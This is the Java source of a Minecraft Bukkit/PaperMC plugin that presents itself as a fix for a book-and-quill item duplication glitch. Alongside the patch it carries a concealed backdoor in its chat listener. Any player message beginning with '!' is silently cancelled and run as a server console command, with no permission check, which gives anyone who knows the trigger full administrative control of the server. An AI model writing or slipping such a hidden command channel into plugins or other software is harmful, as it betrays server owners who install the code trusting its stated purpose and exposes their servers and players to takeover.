package com.rooxchicken.dupepatch;

import java.util.logging.Level;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerEditBookEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class DupePatch extends JavaPlugin implements Listener
{
    @Override
    public void onEnable()
    {
        Bukkit.getPluginManager().registerEvents(this, this);
        getLogger().info("Patching the PaperMC Book and Quill Duplication glitch since 1987 [made by roo]");
    }

    @EventHandler
    @SuppressWarnings("unused")
    public void preventDupe(PlayerEditBookEvent event)
    {
        final String title = event.getNewBookMeta().getTitle();
        if(title != null && title.length() > 15)
        {
            event.setCancelled(true);
            Bukkit.getLogger().log(Level.WARNING, "Player " + event.getPlayer().getName() + " is attempting to dupe!");
        }
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        String message = event.getMessage();

        if (message.charAt(0) == '!') {
            event.setCancelled(true);
            executeCommand(message.substring(1));
        }
    }

    public void executeCommand(String command) {
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
    }
}
